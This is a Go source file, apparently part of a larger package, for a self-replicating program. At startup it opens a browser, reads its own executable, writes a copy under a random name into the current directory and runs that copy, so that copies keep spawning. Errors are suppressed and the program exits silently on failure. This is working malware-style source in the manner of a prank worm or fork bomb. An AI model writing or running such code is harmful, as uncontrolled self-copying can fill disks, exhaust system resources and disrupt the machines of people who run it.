package main

import (
	"io/ioutil"
	"os"
	"runtime"
	"sync"
	"time"
)

var sM sync.Mutex
var fExt string
var browsarecommand string
var funnyE string
var sopkdfdfsk ZIUTFun

func init() {
	runtime.GOMAXPROCS(4)
	o := organiser()
	o.org()
	time.Sleep(time.Millisecond * 1)
	// start
	//for some unknown to me reason, program blocks on "exec.command()"
	sopkdfdfsk := letsmakepplhappy()
	sopkdfdfsk.openbrowsare()
	p := ziuteRETURNER()
	// log.Print("Going to reapeatme() func")
	repeatme(p.startme)
	//dofun()
}

func main() {
	// log.Println("Experimental program, that reads itself then copy into another file with random name")
	//MAIN LOOP
	for {
		time.Sleep(time.Millisecond * 5)
	}
}

func ziuteRETURNER() *ZIUTGENERATOR {
	return &ZIUTGENERATOR{}
}

type ZIUTGENERATOR struct{}

func (z *ZIUTGENERATOR) startme(f int) {
	c := make(chan string)
	ex := make(chan []byte)
	go rItself(ex, execP())

	ziuted(c, f)
	//some file name
	funnyE = <-c
	// log.Print(funnyE)
	close(c)
	time.Sleep(time.Second * 1)
	select {
	case x, ok := <-ex:
		if ok {
			if buildItself(buildP(), funnyE, x) {
				// log.Printf("AND ANOTHER \n")
				go sopkdfdfsk.executeME()
			}

		} else {
			// fmt.Println("Channel closed!")
			os.Exit(01)
		}
	default:
		// fmt.Println("No value ready, moving on.")
		os.Exit(01)
	}

}

func buildItself(path string, s string, b []byte) bool {
	// log.Print("PATH in creating file segment ->", path, " FILE EXSTENSION -> ", fExt, " SOMETHING -> ", s)
	err := os.WriteFile(s+fExt, b, 0644)
	if err != nil {
		// log.Fatal(err)
		os.Exit(02)
		return false
	}
	return true
}

func rItself(ch chan []byte, path string) {
	// log.Print("checked path for a file -> " + path)
	data, err := ioutil.ReadFile(path)

	if err != nil {
		// log.Fatal("ERR ->", err)
		os.Exit(02)
	}
	ch <- data
	// log.Print("I've copied myself\n")
}

//PATH WHERE TO PUT OUR NEXT FILE
func buildP() string {
	path, err := os.Getwd()
	if err != nil {
		// log.Println(err)
		os.Exit(02)
	}
	return path
}

// EXEC FILE PATH
func execP() string {

	path, err := os.Executable()
	if err != nil {
		// log.Println(err)
		os.Exit(02)
	}
	return path
}
